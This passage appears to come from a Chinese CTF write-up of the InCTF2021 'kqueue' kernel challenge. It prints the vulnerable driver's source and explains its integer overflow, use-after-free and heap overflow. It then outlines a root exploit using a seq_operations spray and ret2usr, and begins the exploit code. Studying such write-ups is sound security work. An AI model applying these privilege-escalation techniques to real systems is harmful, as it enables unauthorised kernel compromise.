+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>request<span class="token punctuation">.</span>max_entries<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">!=</span>request<span class="token punctuation">.</span>max_entries<span class="token punctuation">)</span>
+            prev_entry<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+        current_entry<span class="token operator">-></span>idx <span class="token operator">=</span> i<span class="token punctuation">;</span>
+        current_entry<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">,</span>GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/* Increment current_entry by size of queue_entry */</span>
+        current_entry <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue_entry<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">16</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/* Populate next pointer of the previous entry */</span>
+        prev_entry<span class="token operator">-></span>next <span class="token operator">=</span> current_entry<span class="token punctuation">;</span>
+        prev_entry <span class="token operator">=</span> prev_entry<span class="token operator">-></span>next<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">/* Find an appropriate slot in kqueues */</span>
+    <span class="token class-name">uint32_t</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>MAX_QUEUES<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>kqueues<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span>MAX_QUEUES<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] No kqueue slot left"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Assign the newly created kqueue to the kqueues */</span>
+    kqueues<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">;</span>
+    queueCount<span class="token operator">++</span><span class="token punctuation">;</span>
+    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>create 分配队列，queue 的 data 字段和每个 entry 的 data 字段，分配 data_size 大小的内存，所有entry 结构紧跟在 queue 后面，entry 之间还通过 next 指针链接起来，queue 指针存放到全局 kqueues 变量数组里，queue 的情况大致如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">queue(size &#x3D; sizeof(queue_entry) * (request.max_entries+1) + sizeof(queue)):
+	data_size
+    queue_size
+    max_entries
+    idx
+    data
+    struct queue_entry[max_entries];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中的 <code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code> 的作用是 <code>space = sizeof(queue_entry) * (request.max_entries+1)</code>，并且乘法溢出的时候返回 true，后面的 <code>__builtin_saddll_overflow</code> 就是加法溢出检查了</p>
+<p>溢出检查存在一个问题，就是 <code>(request.max_entries+1)</code> 这里本身没有做溢出检查，使 <code>max_entries</code> 为 0xffffffff，那么加 1 溢出为0，最后计算出来 <code>queue_size = sizeof(queue)</code> 就不对了</p>
+<p>然后还有一个应该是出题人写错的地方，就是这个 <code>err</code> 是个函数：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">err</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_ALERT <span class="token string">"%s\n"</span><span class="token punctuation">,</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所有的检查失败都调用这个函数，但是<strong>这个函数并不会影响后面的流程，那么所有的参数检查都是无效的</strong>，因为这个问题，后面利用的时候比官方 wp 还要简单，应该是非预期了，如果 <code>err</code> 写成宏函数就没有问题了</p>
+<p>delete 操作只是把队列删掉了，指针也置 NULL 了，不过还有槽点，指针 free 后还要改写其指向内容，这会破坏堆管理吧（应该又是写错了）：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">long</span> <span class="token function">delete_kqueue</span><span class="token punctuation">(</span><span class="token class-name">request_t</span> request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token comment">/* Check for out of bounds requests */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>queue_idx<span class="token operator">></span>MAX_QUEUES<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Check for existence of the request kqueue */</span>
+    queue <span class="token operator">*</span>queue <span class="token operator">=</span> kqueues<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Requested kqueue does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token function">kfree</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>queue<span class="token operator">-></span>queue_size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// UAF</span>
+    kqueues<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>edit 操作:</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">long</span> <span class="token function">edit_kqueue</span><span class="token punctuation">(</span><span class="token class-name">request_t</span> request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token comment">/* Check the idx of the kqueue */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>queue_idx <span class="token operator">></span> MAX_QUEUES<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Invalid kqueue idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Check if the kqueue exists at that idx */</span>
+    queue <span class="token operator">*</span>queue <span class="token operator">=</span> kqueues<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] kqueue does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Check the idx of the kqueue entry */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>entry_idx <span class="token operator">></span> queue<span class="token operator">-></span>max_entries<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Invalid kqueue entry_idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Get to the kqueue entry memory */</span>
+    queue_entry <span class="token operator">*</span>kqueue_entry <span class="token operator">=</span> <span class="token punctuation">(</span>queue_entry <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>queue <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Check for the existence of the kqueue entry */</span>
+    exists <span class="token operator">=</span> false<span class="token punctuation">;</span>
+    <span class="token class-name">uint32_t</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>queue<span class="token operator">-></span>max_entries<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        
+        <span class="token comment">/* If kqueue entry found , do the necessary */</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>kqueue_entry <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data <span class="token operator">&amp;&amp;</span> queue<span class="token operator">-></span>data_size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>kqueue_entry<span class="token operator">-></span>idx <span class="token operator">==</span> request<span class="token punctuation">.</span>entry_idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>kqueue_entry<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data<span class="token punctuation">,</span>queue<span class="token operator">-></span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                exists <span class="token operator">=</span> true<span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        kqueue_entry <span class="token operator">=</span> kqueue_entry<span class="token operator">-></span>next<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">/* What if the idx is 0, it means we have to update the main kqueue's data */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>entry_idx<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> kqueue_entry <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data <span class="token operator">&amp;&amp;</span> queue<span class="token operator">-></span>data_size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>queue<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data<span class="token punctuation">,</span>queue<span class="token operator">-></span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>exists<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> NOT_EXISTS<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>根据参数 queue_idx 选择队列，找到 entry_idx 对应的 entry 写入 data 指向的数据，需要注意的是 queue 结构体也有一个 data 字段，这个相当于 entry_idx 为 0 的 entry，可以算是头节点吧，没有什么漏洞点，但是这里也有个槽点，就是这个 request-&gt;data 可是用户地址空间的指针，要不是 SMAP 没开，<code>validate(memcpy(kqueue_entry-&gt;data,request.data,queue-&gt;data_size));</code> 就炸了</p>
+<p>save 操作：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">long</span> <span class="token function">save_kqueue_entries</span><span class="token punctuation">(</span><span class="token class-name">request_t</span> request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+
+    <span class="token comment">/* Check for out of bounds queue_idx requests */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>queue_idx <span class="token operator">></span> MAX_QUEUES<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Invalid kqueue idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Check if queue is already saved or not */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>isSaved<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span><span class="token operator">==</span>true<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Queue already saved"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    queue <span class="token operator">*</span>queue <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span>kqueues<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Check if number of requested entries exceed the existing entries */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>max_entries <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> request<span class="token punctuation">.</span>max_entries <span class="token operator">></span> queue<span class="token operator">-></span>max_entries<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Invalid entry count"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Allocate memory for the kqueue to be saved */</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>new_queue <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kzalloc</span><span class="token punctuation">(</span>queue<span class="token operator">-></span>queue_size<span class="token punctuation">,</span>GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Each saved entry can have its own size */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data_size <span class="token operator">></span> queue<span class="token operator">-></span>queue_size<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Entry size limit exceed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Copy main's queue's data */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>queue<span class="token operator">-></span>data <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span>
+        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>new_queue<span class="token punctuation">,</span>queue<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    new_queue <span class="token operator">+=</span> queue<span class="token operator">-></span>data_size<span class="token punctuation">;</span>
+
+    <span class="token comment">/* Get to the entries of the kqueue */</span>
+    queue_entry <span class="token operator">*</span>kqueue_entry <span class="token operator">=</span> <span class="token punctuation">(</span>queue_entry <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>queue <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* copy all possible kqueue entries */</span>
+    <span class="token class-name">uint32_t</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>request<span class="token punctuation">.</span>max_entries<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>kqueue_entry <span class="token operator">||</span> <span class="token operator">!</span>kqueue_entry<span class="token operator">-></span>data<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>kqueue_entry<span class="token operator">-></span>data <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span>
+            <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>new_queue<span class="token punctuation">,</span>kqueue_entry<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        kqueue_entry <span class="token operator">=</span> kqueue_entry<span class="token operator">-></span>next<span class="token punctuation">;</span>
+        new_queue <span class="token operator">+=</span> queue<span class="token operator">-></span>data_size<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">/* Mark the queue as saved */</span>
+    isSaved<span class="token punctuation">[</span>request<span class="token punctuation">.</span>queue_idx<span class="token punctuation">]</span> <span class="token operator">=</span> true<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>save 操作把指定数量的 data 存放到新分配的大小为 <code>queue_size</code> 的内存里，然后这里有个漏洞点：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token comment">/* Each saved entry can have its own size */</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data_size <span class="token operator">></span> queue<span class="token operator">-></span>queue_size<span class="token punctuation">)</span>
+        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Entry size limit exceed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>queue<span class="token operator">-></span>data <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span>
+        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>new_queue<span class="token punctuation">,</span>queue<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>request<span class="token punctuation">.</span>max_entries<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>kqueue_entry <span class="token operator">||</span> <span class="token operator">!</span>kqueue_entry<span class="token operator">-></span>data<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>kqueue_entry<span class="token operator">-></span>data <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span>
+            <span class="token function">validate</span><span class="token punctuation">(</span><span class="token function">memcpy</span><span class="token punctuation">(</span>new_queue<span class="token punctuation">,</span>kqueue_entry<span class="token operator">-></span>data<span class="token punctuation">,</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        kqueue_entry <span class="token operator">=</span> kqueue_entry<span class="token operator">-></span>next<span class="token punctuation">;</span>
+        new_queue <span class="token operator">+=</span> queue<span class="token operator">-></span>data_size<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所有的 memcpy 使用的长度都是用户传递过来的 <code>request.data_size</code>，而参数检查里面只检查了 <code>request.data_size</code> 是否超过 <code>queue-&gt;queue_size</code>， 理应是 <code>if(request.data_size &gt; queue-&gt;data_size)</code>，这就存在一个堆溢出了 （<del>虽然参数检查一点用没有</del>）</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>如果不考虑参数检查，利用方式非常简单，同时这也是 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9AInCTF2021-Kqueue"><strong>@arttnba3</strong></a> 师傅的做法</p>
+<ol>
+<li>create 操作，利用 <code>request.max_entries=0xffffffff</code> 溢出，创造一个只有 0x18 大小的 queue，并且忽略参数检查，data_size 比 queue_size 大，后面 save 才能溢出</li>
+<li>堆喷射大量的 seq_operations，堆溢出后改写 seq_operations 的指针劫持程序执行流</li>
+<li>劫持程序执行流，ret2usr，根据栈上面的数据泄露内核基址，执行 <code>commit_creds(prepare_kernel_cred(0));</code> 提权后返回用户态起 shell 即可</li>
+</ol>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
+
+
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
+    <span class="token class-name">uint32_t</span> max_entries<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> data_size<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> entry_idx<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> queue_idx<span class="token punctuation">;</span>
+    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token class-name">request_t</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> fd<span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">create_kqueue</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> max_entries<span class="token punctuation">,</span> <span class="token class-name">uint16_t</span> data_size<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token class-name">request_t</span> req <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+		<span class="token punctuation">.</span>max_entries <span class="token operator">=</span> max_entries<span class="token punctuation">,</span>
+		<span class="token punctuation">.</span>data_size <span class="token operator">=</span> data_size<span class="token punctuation">,</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xDEADC0DE</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">edit_kqueue</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> queue_idx<span class="token punctuation">,</span> <span class="token class-name">uint16_t</span> entry_idx<span class="token punctuation">,</span>  <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token class-name">request_t</span> req <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+		<span class="token punctuation">.</span>queue_idx <span class="token operator">=</span> queue_idx<span class="token punctuation">,</span>
+		<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">,</span>
+		<span class="token punctuation">.</span>entry_idx <span class="token operator">=</span> entry_idx<span class="token punctuation">,</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xDAADEEEE</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">delete_kqueue</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> queue_idx<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token class-name">request_t</span> req <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+		<span class="token punctuation">.</span>queue_idx  <span class="token operator">=</span> queue_idx<span class="token punctuation">,</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xBADDCAFE</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
